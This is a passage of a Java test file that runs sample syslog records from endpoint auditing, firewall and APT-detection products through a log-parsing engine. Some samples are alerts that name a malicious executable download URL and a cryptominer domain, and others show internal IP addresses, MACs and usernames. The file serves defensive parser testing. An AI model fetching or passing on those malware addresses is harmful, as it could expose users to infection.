      data = "<140>1 2021-03-12T16:24:42Z topdesk eventinfo - - - id=\"151930\" agentid=\"3A1C01-82C7-B78F-C032-84BE4258085338\" logtype=\"PERFORMANCE\" logtime=\"2021-03-13 08:00:00.142\" action=\"使用\" object_class=\"硬件资源\" object_name=\"内存\" objectinfo=\"<子项><开始检测时间>2021-01-18 20:24:00.472</开始检测时间><结束检测时间>2021-01-18 20:34:00.493</结束检测时间><阈值门限>1</阈值门限></子项>\" reason=\"\" loglevel=\"2\" handle=\"审计\" result=\"成功\" subject=\"<用户帐号>ltf</用户帐号><计算机名称>ltf-virtual-machine</计算机名称>\" subject_name=\"ltf-virtual-machine\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"性能监控\" trigger_text=\"7\" event_from=\"tdasvc.perf\" event_id=\"\" agentip=\"172.19.4.121\" ipcode=\"-1408039815\" agentmac=\"00:0C:29:FB:E8:D8\" depart=\"/topsec/未知\" username=\"未知\" agentversion=\"_3.0-0.0.1139.201224.ky10_amd64\" cid=\"系统性能审计日志.计算机.使用.硬件资源.审计.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.12.58\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-12T16:24:40Z topdesk eventinfo - - - id=\"209639\" agentid=\"B9D15054-CC71-8230-BC89-A482C4971E63\" logtype=\"OSAUTH\" logtime=\"2021-03-13 08:00:00.142\" action=\"登录\" object_class=\"计算机\" object_name=\"topsec\" objectinfo=\"<日志内容><登录IP>topsec</登录IP><登录终端>tty1</登录终端><登录帐号>topsec</登录帐号><登录服务>deepin-authentication</登录服务><时间>2021-01-21 23:14:04</时间></日志内容>\" reason=\"\" loglevel=\"2\" handle=\"\" result=\"失败\" subject=\"<用户帐号>topsec</用户帐号><计算机>topsec</计算机>\" subject_name=\"topsec\" subject_class=\"用户\" trigger_type=\"策略\" trigger_name=\"日志监控\" trigger_text=\"\" event_from=\"tdasvc.logmon\" event_id=\"\" agentip=\"192.168.16.154\" ipcode=\"-1062727526\" agentmac=\"1C:83:41:28:77:3B\" depart=\"/topsec/未知\" username=\"未知\" agentversion=\"_3.0-0.1.125.210122.uos20_arm64\" cid=\"身份鉴别日志.用户.登录.计算机..失败\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.12.58\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-12T16:25:43Z topdesk eventinfo - - - id=\"1310\" agentid=\"172.19.12.58\" logtype=\"SERVERSTATECHANGE\" logtime=\"2021-03-13 08:00:00.142\" action=\"服务状态变更\" object_class=\"172.19.12.58\" object_name=\"服务状态变更\" objectinfo=\"<状态变更>服务SJRJ：停止</状态变更>\" reason=\"服务状态变更，服务SJRJ：停止\" loglevel=\"通知\" handle=\"报警\" result=\"成功\" subject=\"<日志类型>服务器</日志类型><服务器IP>172.19.12.58</服务器IP>\" subject_name=\"172.19.12.58\" subject_class=\"服务器\" agentip=\"172.19.12.58\" ipcode=\"\" agentmac=\"\" depart=\"系统报警\" username=\"系统报警\" agentversion=\"\" ishandle=\"\" behaviourtype=\"异常行为\" is_send=\"0\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-12T16:25:43Z topdesk eventinfo - - - id=\"1074\" agentid=\"172.19.12.58\" logtype=\"SERVERPERFORMANCE\" logtime=\"2021-03-13 08:00:00.142\" action=\"磁盘空间预警\" object_class=\"172.19.12.58\" object_name=\"磁盘空间\" objectinfo=\"<磁盘空间>26607.00MB</磁盘空间><磁盘使用>23455.87MB</磁盘使用><报警阈值百分比>64%</报警阈值百分比><将满报警阈值>13622.79MB</将满报警阈值>\" reason=\"所用磁盘空间大小为23455.87MB，已将达到设定的阈值(64%)\" loglevel=\"警告\" handle=\"报警\" result=\"成功\" subject=\"<日志类型>服务器</日志类型><服务器IP>172.19.12.58</服务器IP>\" subject_name=\"172.19.12.58\" subject_class=\"服务器\" agentip=\"172.19.12.58\" ipcode=\"\" agentmac=\"\" depart=\"系统报警\" username=\"系统报警\" agentversion=\"\" ishandle=\"\" behaviourtype=\"异常行为\" is_send=\"0\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T16:09:13Z topdesk eventinfo - - - id=\"156147\" agentid=\"E564AF00-4BB8-C593-9839-7C949B1EDE36\" logtype=\"DEVMONITOR\" logtime=\"2021-03-15 06:23:03.036\" action=\"停用\" object_class=\"蓝牙设备\" object_name=\"文件传输\" objectinfo=\"\" reason=\"\" loglevel=\"2\" handle=\"停用\" result=\"成功\" subject=\"\" subject_name=\"uos-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"设备监控\" trigger_text=\"\" event_from=\"tdasvc.devmonitor\" event_id=\"\" agentip=\"192.168.173.155\" ipcode=\"-1062687333\" agentmac=\"00:0C:29:97:99:AB\" depart=\"/topsec/动物园里有哪些动物\" username=\"小猫咪\" agentversion=\"_3.0-0.1.254.210305.uos20_amd64\" cid=\"设备监控事件.计算机.停用.蓝牙设备.停用.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T16:17:10Z topdesk eventinfo - - - id=\"20927\" agentid=\"EF31013E-1E1B-B7F1-E2E4-3B2E4CDC1806\" logtype=\"AntiVirusProduct\" logtime=\"2021-03-12 02:00:53.000\" action=\"杀毒软件\" object_class=\"开机监控\" object_name=\"检测杀毒软件\" objectinfo=\"<客户端IP>192.168.35.222</客户端IP><杀毒软件>未安装杀毒软件</杀毒软件>\" reason=\"未安装杀毒软件\" loglevel=\"5\" handle=\"报警\" result=\"成功\" subject=\"<计算机>topdesk-CX-TL630-Series</计算机>\" subject_name=\"topdesk-CX-TL630-Series\" subject_class=\"终端\" trigger_type=\"策略\" trigger_name=\"检测杀毒软件\" trigger_text=\"\" event_from=\"\" event_id=\"\" agentip=\"192.168.35.222\" ipcode=\"-1062722594\" agentmac=\"60:9B:C8:33:51:20\" depart=\"/topsec/TRX测试\" username=\"pp\" agentversion=\"_3.0-0.1.254.210305.ky10_mips64el\" cid=\"杀毒软件报警事件.进程.开机.检测杀毒软件.报警.成功\" is_send=\"0\" clog=\"0\" ishandle=\"已查阅\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T17:03:07Z topdesk eventinfo - - - id=\"172028\" agentid=\"81AE4377-66A8-7137-E1FB-9B01EDDAC6FA\" logtype=\"HTTPMONITOR\" logtime=\"2021-03-15 14:58:37.089\" action=\"访问\" object_class=\"域名\" object_name=\"限制域名\" objectinfo=\"<域名>192.168.64.66</域名>\" reason=\"\" loglevel=\"2\" handle=\"阻止\" result=\"成功\" subject=\"<用户帐号>root</用户帐号>\" subject_name=\"gjh-virtual-machine\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"HTTP监控\" trigger_text=\"2322156\" event_from=\"tdasvc.httpmonitor\" event_id=\"\" agentip=\"192.168.173.147\" ipcode=\"-1062687341\" agentmac=\"00:0C:29:9E:98:A9\" depart=\"/topsec/动物园里有哪些动物\" username=\"rabbit\" agentversion=\"_3.0-0.1.254.210305.ky10_amd64\" cid=\"HTTP审计日志.计算机.访问.域名.阻止.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T16:43:04Z topdesk eventinfo - - - id=\"173393\" agentid=\"6747D949-805B-F125-EACD-5CB1F6813D0C\" logtype=\"LOGON\" logtime=\"2021-03-15 15:34:52.103\" action=\"关机\" object_class=\"计算机\" object_name=\"yuziwei-PC\" objectinfo=\"<登录用户>yuziwei</登录用户><登录点>本地</登录点><登录时间>2021-03-05 10:24:50</登录时间><登出时间>2021-03-15 15:32:12</登出时间><状态>关机</状态>\" reason=\"\" loglevel=\"2\" handle=\"审计\" result=\"成功\" subject=\"<用户帐号>yuziwei</用户帐号><计算机名称>yuziwei-PC</计算机名称>\" subject_name=\"yuziwei\" subject_class=\"用户\" trigger_type=\"策略\" trigger_name=\"登录监控\" trigger_text=\"\" event_from=\"tdasvc.logon\" event_id=\"\" agentip=\"192.168.35.232\" ipcode=\"-1062722584\" agentmac=\"60:9B:C8:33:53:2A\" depart=\"/topsec/未分组\" username=\"未知\" agentversion=\"_3.0-0.1.254.210305.uos20_mips64el\" cid=\"登录审计日志.用户.关机.计算机.审计.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T17:03:05Z topdesk eventinfo - - - id=\"44813\" agentid=\"BE727E05-0E63-7134-63F5-8C6C8B42B1BC\" logtype=\"SERVICE\" logtime=\"2021-03-12 15:28:30.161\" action=\"重启\" object_class=\"监控服务\" object_name=\"cups\" objectinfo=\"<Service><用户账号>root</用户账号><服务类型>监控服务</服务类型><程序源路径>/usr/sbin/cupsd</程序源路径><服务名称>cups</服务名称><公司名称> Kylin Developers &lt;devel-discuss@kylinos.cn&gt; </公司名称><服务描述/><启动方式>开机自启</启动方式><服务重启时间>2021-03-12 15:28:30.161</服务重启时间></Service>\" reason=\"\" loglevel=\"2\" handle=\"允许\" result=\"成功\" subject=\"<用户帐号>root</用户帐号>\" subject_name=\"topdesk-CX-TF830-Series\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"系统服务策略\" trigger_text=\"\" event_from=\"tdasvc.service\" event_id=\"\" agentip=\"192.168.35.54\" ipcode=\"-1062722762\" agentmac=\"1C:83:41:28:75:25\" depart=\"/topsec/kylin_arm\" username=\"gysec\" agentversion=\"_3.0-0.1.254.210305.ky10_arm64\" cid=\"服务监控事件.计算机.重启.监控服务.允许.成功\" is_send=\"0\" clog=\"0\" ishandle=\"已查阅\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T16:27:05Z topdesk eventinfo - - - id=\"46718\" agentid=\"77F22C7F-F40C-8559-23F5-E40A8BAC5ED8\" logtype=\"BRASERO\" logtime=\"2021-03-12 16:32:04.021\" action=\"刻录\" object_class=\"文件/文件夹\" object_name=\"文件\" objectinfo=\"<文件>/TDAKLGN0(副本).log</文件>\" reason=\"\" loglevel=\"2\" handle=\"允许刻录\" result=\"成功\" subject=\"<用户帐号>gjh</用户帐号><计算机名称>gjh-PC</计算机名称>\" subject_name=\"gjh-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"刻录监控\" trigger_text=\"2\" event_from=\"tdasvc.burn\" event_id=\"\" agentip=\"192.168.35.248\" ipcode=\"-1062722568\" agentmac=\"30:FD:65:75:FA:3E\" depart=\"/topsec/动物园里有哪些动物\" username=\"小脑斧\" agentversion=\"_3.0-0.1.254.210305.uos20_arm64\" cid=\"刻录审计日志.计算机.刻录.文件/文件夹.允许刻录.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T16:41:13Z topdesk eventinfo - - - id=\"169910\" agentid=\"7FA6D292-C38C-33E8-0DDB-57CDF51F80EE\" logtype=\"TIMECHANGED\" logtime=\"2021-03-15 14:10:22.000\" action=\"修改系统时间\" object_class=\"系统参数\" object_name=\"系统时间\" objectinfo=\"<原系统时间>2021-03-15 22:10:44</原系统时间><新系统时间>2021-03-15 14:10:22</新系统时间><原时区/><新时区/>\" reason=\"\" loglevel=\"2\" handle=\"允许\" result=\"成功\" subject=\"<用户>root</用户>\" subject_name=\"topdesk-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"时间监控\" trigger_text=\"\" event_from=\"tdasvc.timechange\" event_id=\"\" agentip=\"192.168.35.253\" ipcode=\"-1062722563\" agentmac=\"00:0C:29:AD:53:A8\" depart=\"/topsec/未分组\" username=\"未知\" agentversion=\"_3.0-0.1.254.210305.uos20_amd64\" cid=\"客户端时间变更事件.计算机.修改系统时间.系统参数.允许.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T15:34:04Z topdesk eventinfo - - - id=\"21\" agentid=\"172.19.2.222\" logtype=\"DATABASE\" logtime=\"2021-03-15 15:33:22\" action=\"备份数据处理\" object_class=\"172.19.2.222\" object_name=\"备份数据处理\" objectinfo=\"<备份数据></备份数据>\" reason=\"备份数据\" loglevel=\"通知\" handle=\"报警\" result=\"成功\" subject=\"<日志类型></日志类型><服务器IP>172.19.2.222</服务器IP>\" subject_name=\"172.19.2.222\" subject_class=\"服务器\" agentip=\"172.19.2.222\" ipcode=\"\" agentmac=\"\" depart=\"系统报警\" username=\"系统报警\" agentversion=\"\" ishandle=\"已查阅\" behaviourtype=\"异常行为\" is_send=\"0\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T16:33:10Z topdesk eventinfo - - - id=\"465\" agentid=\"77F22C7F-F40C-8559-23F5-E40A8BAC5ED8\" logtype=\"INTERNET\" logtime=\"2021-03-11 14:47:50.334\" action=\"连接\" object_class=\"网络\" object_name=\"内网和互联网\" objectinfo=\"<Internet><状态>连接内网和互联网</状态><用户账号>gjh</用户账号></Internet>\" reason=\"探测出连接内外网\" loglevel=\"2\" handle=\"提示\" result=\"成功\" subject=\"<用户账号>gjh</用户账号>\" subject_name=\"gjh-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"外联监控\" trigger_text=\"6158741\" event_from=\"tdasvc.internetmonitor\" event_id=\"\" agentip=\"192.168.35.248\" ipcode=\"-1062722568\" agentmac=\"30:FD:65:75:FA:3E\" depart=\"/topsec/动物园里有哪些动物\" username=\"小猴几\" agentversion=\"_3.0-0.1.254.210305.uos20_arm64\" cid=\"外联监控.计算机.连接.网络.提示.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
      data = "<140>1 2021-03-15T16:49:09Z topdesk eventinfo - - - id=\"174020\" agentid=\"E564AF00-4BB8-C593-9839-7C949B1EDE36\" logtype=\"NETCONFIG\" logtime=\"2021-03-15 15:54:23.702\" action=\"修改\" object_class=\"网络配置\" object_name=\"ip\" objectinfo=\"<原ip>192.168.16.164</原ip><新ip>192.168.16.3</新ip><网络接口>ens37</网络接口>\" reason=\"\" loglevel=\"2\" handle=\"允许\" result=\"成功\" subject=\"<用户账号>runlevel</用户账号><计算机名称>uos-PC</计算机名称>\" subject_name=\"uos-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"网络参数监控\" trigger_text=\"3\" event_from=\"tdasvc.netconfig\" event_id=\"\" agentip=\"192.168.173.155\" ipcode=\"-1062687333\" agentmac=\"00:0C:29:97:99:AB\" depart=\"/topsec/动物园里有哪些动物\" username=\"小猫咪\" agentversion=\"_3.0-0.1.254.210305.uos20_amd64\" cid=\"网络配置审计日志.计算机.修改.网络配置.允许.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.2.222\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信工控防火墙
  public void testFirewallTopsecTopifwyslog() {
    String parserFile = "./resources/parsers/firewall_topsec_topifw[2.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<4>Apr  1 18:29:03 INS-T Pri: 4 type: attacklog [271351.075275] attacklog-synflood- SRC=63.56.44.225 DST=10.10.0.130 COUNT=36052 TIME=5s";
      parse(botuEngine, data);
      data = "<4>Apr  1 18:30:05 INS-T Pri: 4 type: attacklog [271413.105804] attacklog-landattack- IN=eth0 OUT= MAC=00:e2:69:0b:18:cf:00:0c:29:9f:de:40:08:00 SRC=10.10.0.130 DST=10.10.0.130 LEN=40 TOS=0x00 PREC=0x00 TTL=64 ID=27704 PROTO=TCP SPT=80 DPT=80 WINDOW=512 RES=0x00 SYN URGP=0";
      parse(botuEngine, data);
      data = "<13>Apr  1 15:26:26 TopIFW Pri: 5 type: config Sub: null Obj: null Mod: network *User:superman Succeed to edit vsi interface:vsi0.*";
      parse(botuEngine, data);
      data = "<13>Apr  1 18:32:51 INS-T Pri: 5 type: config Sub: null Obj: null Mod: firewall *User:admin success to Edit a security policy: name:newpolicy235 srcZone:trust destZone:input srcAddr:any destAddr:any serve:any timeObj:any action:NFQ maxConnect:no.*";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  // 华为防火墙
  public void testHuaweiFirewall() {
    String parserFile = "./resources/parsers/firewall_huawei_firewall_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<190>Dec 24 2021 14:59:58 neiwang-firewall-M %%01POLICY/6/POLICYPERMIT(l):vsys=public, protocol=6, source-ip=192.168.0.124, source-port=54608, destination-ip=10.166.128.65, destination-port=445, time=2021/12/24 14:59:58, source-zone=trust, destination-zone=untrust, application-name=, rule-name=trust-untrust.";
     /* parse(botuEngine, data);
      data = "<190>2022-01-11 02:36:06 USG6600 %%01SECLOG/6/SESSION_TEARDOWN(l):IPVer=4,Protocol=tcp,SourceIP=202.118.76.192,DestinationIP=210.30.96.241,SourcePort=33394,DestinationPort=1433,BeginTime=1641868543,EndTime=1641868549,SendPkts=8,SendBytes=932,RcvPkts=5,RcvBytes=652,SourceVpnID=0,DestinationVpnID=0,SourceZone=untrust,DestinationZone=trust,PolicyName=MenJin-zfc-xb,CloseReason=tcp-fin,ApplicationName=MS_SQLServer.";
      parse(botuEngine, data);
      data = "<189>Jan 11 2022 02:35:53 USG6600 %%01SHELL/5/CMDRECORD(s)[0]:Recorded command information. (Task=HTPN, Ip=210.30.96.249, VpnName=, User=admin, AuthenticationMethod=\"Null\", Command=\"undo info-center loghost 210.30.96.110\")";
      parse(botuEngine, data);
      data = "<188>Jan 11 2022 02:35:55 USG6600 DS/4/DATASYNC_CFGCHANGE:OID 1.3.6.1.4.1.2011.5.25.191.3.1 configurations have been changed. The current change number is 847, the change loop count is 0, and the maximum number of records is 4095.";
      parse(botuEngine, data);
      data = "<190>Jan 17 2022 01:03:41 USG6600 %%01POLICY/6/POLICYDENY(l):vsys=public, protocol=6, source-ip=103.146.174.156, source-port=40156, destination-ip=210.30.96.206, destination-port=1433, time=2022/1/17 09:03:41, source-zone=untrust, destination-zone=trust, application-name=, rule-name=av_22-23.";
      parse(botuEngine, data);
      data = "<190>Jan 17 2022 01:00:26 USG6600 %%01SHELL/6/DISPLAY_CMDRECORD(s)[43104]:Recorded display command information. (Task=FW, Ip=**, VpnName=, User=_system_, AuthenticationMethod=\"Null\", Command=\"display diagnostic-information hf-log\")";
      parse(botuEngine, data);
      data = "<188>Jan 19 2022 01:15:13  USG6600 %%01ASSOC/4/ATTACK(l):An associated intrusion was detected. (SyslogId=192824, VSys=\"public\", Policy=\"Ĭ ϰ ȫ\", SrcIp=210.30.97.187, DstIp=1.14.111.105, SrcPort=62153, DstPort=49153, SrcZone=trust, DstZone=untrust, User=\"unknown\", Protocol=TCP, Application=\"RDP\", Profile=\"default\", SignName=\"RDP Local Account Brute-force Attempt\", SignId=1000127, EventNum=1, Target=server, Severity=high, Os=windows, Category=Scanner, Reference=NA, Action=Alert)";
      parse(botuEngine, data);
      data = "<190>Jan 19 2022 01:37:37 USG6600 %%01SECIF/6/STREAM(l)[57869]:In Last Five Minutes Stream Statistic is :IF1-GE0/0/0,STATE-D,IN-0,OUT-0,IF2-GE1/0/0,STATE-U,IN-14,OUT-24,IF3-GE1/0/1,STATE-U,IN-46,OUT-0,IF4-GE1/0/2,STATE-D,IN-0,OUT-0,IF5-GE1/0/3,STATE-D,IN-0,OUT-0,IF6-GE1/0/4,STATE-D,IN-0,OUT-0,IF7-GE1/0/5,STATE-U,IN-0,OUT-117533,IF8-GE1/0/6,STATE-D,IN-0,OUT-0,IF9-GE1/0/7,STATE-D,IN-0,OUT-0,IF10-GE1/0/8,STATE-U,IN-49968,OUT-67539,IF11-GE1/0/9,STATE-U,IN-67580,OUT-49982,IF12-GE2/0/0,STATE-D,IN-0,OUT-0,IF13-GE2/0/1,STATE-D,IN-0,OUT-0,IF14-GE2/0/2,STATE-D,IN-0,OUT-0,IF15-GE2/0/3,STATE-D,IN-0,OUT-0,IF16-GE2/0/4,STATE-D,IN-0,OUT-0,IF17-GE2/0/5,STATE-D,IN-0,OUT-0,IF18-GE2/0/6,STATE-D,IN-0,OUT-0,IF19-GE2/0/7,STATE-D,IN-0,OUT-0.";
      parse(botuEngine, data);
      data = "<186>Jan 18 2022 23:55:54 USG6600 %%01NLOG/2/DISKFULL(l)[57366]:policy-origin logs have taken up 92% of the reserved storage space for this type of logs.(SyslogId=1506)";
      parse(botuEngine, data);
      data = "<190>Jan 19 2022 01:10:31 USG6600 %%01INFO/6/LOGFILE_DELETED_REASON(s)[57732]:The log file will be deleted. (Reason = log file quantity (101) over the threshold(100))";
      parse(botuEngine, data);
      data = "<188>Jan 25 2022 00:43:05  USG6600 %%01ANTI-APT/4/ANTI_APT(l):An advanced persistent threat was detected. (SyslogId=9598, VSys=\"public\", Policy=\"Ĭ ϰ ȫ\", SrcIp=172.31.81.185, DstIp=58.205.214.152, SrcPort=54535, DstPort=80, SrcZone=trust, DstZone=untrust, User=\"unknown\", Protocol=TCP, Application=\"HTTP_Download\", Profile=\"default\", Direction=download, ThreatType=\"Malicious URL\", ThreatName=\"down1.xiaoyu.vfpzmg.cn/tui/traytip/v1.0.0.1/traytip-5.exe\", Action=Block, FileType=\"\", Hash=\"\")";
      parse(botuEngine, data);
      data = "<190>Jan 24 2022 22:06:14 USG6600 %%01INFO/6/SUPPRESS_LOG(l)[100384]:Last message repeated 3 times.(InfoID=4255911937, ModuleName=POLICY, InfoAlias=POLICYDENY)";
      parse(botuEngine, data);
      data = "<190>Jan 24 2022 20:03:42 USG6600 %%01INFO/6/LOGFILE_DELETED(s)[99758]:The log file hda1:/log/2021-12-14.02-24-57.log.zip is deleted successfully.";
      parse(botuEngine, data);
      data = "<188>Jan 24 2022 16:46:45 USG6600 %%01UPDATE/4/DOWNLOAD_FAIL(l)[98780]:Failed to download the new version. (SyslogId=1595, User=SystemTimer, IP=**, Module=IP-REPUTATION, Status=auto-update, Duration(s)=91, Reason=\"Connecting to the security server failed\", Suggestion=\"Check the Internet settings and try again later\")";
      parse(botuEngine, data);
      data = "<188>Jan 24 2022 09:46:39 USG6600 %%01CFM/4/BACKUPCONFIG_SUC(s)[96668]:Succeeded in backing up file hda1:/$_backup/running_config/20220124174638.USG6600.zip.";
      parse(botuEngine, data);
      data = "<188>Jan 24 2022 07:48:11 USG6600 %%01CFM/4/SAVE(s)[96050]:The user chose Y when deciding whether to save the configuration to the device.";
      parse(botuEngine, data);*/
      data = "<189>Jan 24 2022 07:46:07 USG6600 %%01CM/5/USER_ACCESSRESULT(s)[96043]:[USER_INFO_AUTHENTICATION]DEVICEMAC:2c-ab-00-78-41-34;DEVICENAME:USG6600;USER:admin;MAC:ff-ff-ff-ff-ff-ff;IPADDRESS:210.30.96.249;TIME:1643010367;ZONE:UTC+0800;DAYLIGHT:false;ERRCODE:0;RESULT:success;CIB ID:7;ACCESS TYPE:HTTP;RDSIP:-;";
      parse(botuEngine, data);
    /*  data = "<188>Jan 23 2022 12:44:21 USG6600 %%01FWD/4/SESSINSERTOVERLOAD(l)[90308]:Abnormal traffic was detected. (Vsys=public, VLAN=0, Protocol=TCP, SourceIP=210.30.98.14, SourcePort=50002, DestinationIP=151.101.76.223, DestinationPort=443)";
      parse(botuEngine, data);
      data = "<188>Sep  6 2023 17:59:27  fuwuqi-firewall-M %%01IPS/4/TROJAN(l):A trojan horse was detected. (SyslogId=366257, VSys=\"public\", Policy=\"trust-untrust\", SrcIp=192.168.0.239, DstIp=192.168.0.253, SrcPort=54113, DstPort=53, SrcZone=trust, DstZone=untrust, User=\"unknown\", Protocol=UDP, Application=\"DNS\", Profile=\"default\", SignName=\"Trojan CoinMiner : pilutce.com\", SignId=3360499, EventNum=1, Target=server, Severity=high, Os=windows, Category=Trojan, Role=0, SrcLocation=\"unknown-zone\", DstLocation=\"unknown-zone\", Action=Block)";
      parse(botuEngine, data);*/
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //远江盛邦持续威胁检测与溯源系统1.8.61
  public void testAptWebrayTopapt61() {
    String parserFile = "./resources/parsers/apt_webray_topapt[rayeye_1.8.21]_json.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<14>1 2022-04-12T02:56:41.749Z 172.18.6.187 notice - - - {\"attacker_city\":\"Beijing\",\"kill_chain\":\"attempt-attack\",\"dst_ip_geoloc\":\"39.9047,116.4072\",\"victim_geoloc\":\"39.9047,116.4072\",\"hostip\":\"10.10.1.6\",\"dst_ip_country_code\":\"CN\",\"event_source\":\"NDE\",\"rid\":\"3008313\",\"uuid\":\"f0b21f73-13b1-4cdb-b21f-7313b12cdbbc\",\"number\":1,\"hostname\":\"ATD\",\"payload\":\"\",\"commid\":\"1:ofcECYveA3Z3k3SweaLDNpaTzew=\",\"attack_status\":\"attempt\",\"victim_city\":\"Beijing\",\"attacker_country_code\":\"CN\",\"dst_ip_country\":\"China\",\"victim_country_code\":\"CN\",\"proto\":\"tcp\",\"enrichments.src_ip.malicious\":\"2\",\"desc\":\"\",\"sub_category\":\"\",\"src_ip_city\":\"Beijing\",\"reliability\":1,\"classtype\":\"dos\",\"interface\":\"em2\",\"dst_ip\":\"192.168.8.1\",\"enrichments.dst_ip.malicious\":\"2\",\"src_ip\":\"192.168.8.115\",\"dst_ip_city\":\"Beijing\",\"victim\":\"192.168.8.1\",\"sensor_ip\":\"10.10.1.6\",\"visit_direction\":\"4\",\"timestamp\":\"1649732201749\",\"direction\":\"up\",\"severity\":2,\"attacker\":\"192.168.8.115\",\"victim_country\":\"China\",\"attacker_geoloc\":\"39.9047,116.4072\",\"message\":\"TCP SYN flood attack detected\",\"app_proto\":\"other\",\"target\":\"TCP SYN flood attack detected\",\"src_port\":\"65461\",\"engine_type\":\"sde\",\"src_ip_country_code\":\"CN\",\"attacker_country\":\"China\",\"dst_port\":\"56444\",\"src_ip_geoloc\":\"39.9047,116.4072\",\"src_ip_country\":\"China\",\"category\":\"dos\",\"resp_data\":\"\",\"family\":\"\",\"ts\":\"1649732201.742\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-05-06T10:43:10.861Z 172.18.6.187 metadata - - - {\"TTLs\":\"56\",\"qclass_name\":\"C_INTERNET\",\"qtype_name\":\"A\",\"RDLen_ANS\":\"4\",\"query\":\"www.163.com\",\"answers\":\"211.91.76.22\",\"event_source\":\"ratel_dns\",\"trans_id\":\"5\",\"response_bytes\":\"191\",\"interface\":\"em2\",\"dst_ip\":\"202.106.0.20\",\"rcode_name\":\"NOERROR\",\"src_ip\":\"192.168.21.2\",\"src_port\":\"56410\",\"uid\":\"1489541633169161\",\"rtt\":\"10.029879\",\"proto\":\"udp\",\"commid\":\"1:j8M6voAXoz1iXCH057F+5TmsiOg=\",\"dst_port\":\"53\",\"sensor_ip\":\"10.10.1.6\",\"request_bytes\":\"29\",\"ts\":\"1651833780.731\",\"timestamp\":\"1651833790856\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-05-06T10:39:10.095Z 172.18.6.187 metadata - - - {\"auth_success\":\"F\",\"server_software_version\":\"OpenSSH_7.4\",\"hassh\":\"d887128b0ccc7ba79affe766d741378e\",\"event_source\":\"ratel_ssh\",\"server_proto_version\":\"2.0\",\"interface\":\"em2\",\"dst_ip\":\"172.16.103.44\",\"src_ip\":\"167.99.194.117\",\"src_port\":\"54096\",\"uid\":\"867093679991174\",\"proto_version\":\"2.0\",\"proto\":\"tcp\",\"commid\":\"1:vQYwRShoYXxy3XJZIbexyK/0M5k=\",\"dst_port\":\"22\",\"hasshserver\":\"6832f1ce43d4397c2c0a3e2f8c94334e\",\"software_version\":\"libssh-0.2\",\"sensor_ip\":\"10.10.1.6\",\"ts\":\"1651833550.001\",\"timestamp\":\"1651833550087\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
      data = "<14>1 2022-05-06T10:38:10.092Z 172.18.6.187 metadata - - - {\"method\":\"HEAD\",\"event_source\":\"ratel_http\",\"interface\":\"em2\",\"uri\":\"/robots.txt\",\"version\":\"HTTP/1.1\",\"dst_ip\":\"110.242.68.4\",\"src_ip\":\"192.168.9.146\",\"src_port\":\"55913\",\"uid\":\"1929896218777754\",\"client_header_names\":\"HOST: www.baidu.com\\nCONNECTION: Keep-Alive\\nACCEPT-ENCODING: gzip, deflate\\nACCEPT-LANGUAGE: zh-CN,en,*\\nUSER-AGENT: Mozilla/5.0\\n\",\"proto\":\"tcp\",\"commid\":\"1:9nQsPqzcVqWpxeheRhNY/8YlWis=\",\"dst_port\":\"80\",\"host\":\"www.baidu.com\",\"sensor_ip\":\"10.10.1.6\",\"user_agent\":\"Mozilla/5.0\",\"ts\":\"1651833490.078\",\"timestamp\":\"1651833490087\",\"sensor_name\":\"ATD\"}";
      parse(botuEngine, data);
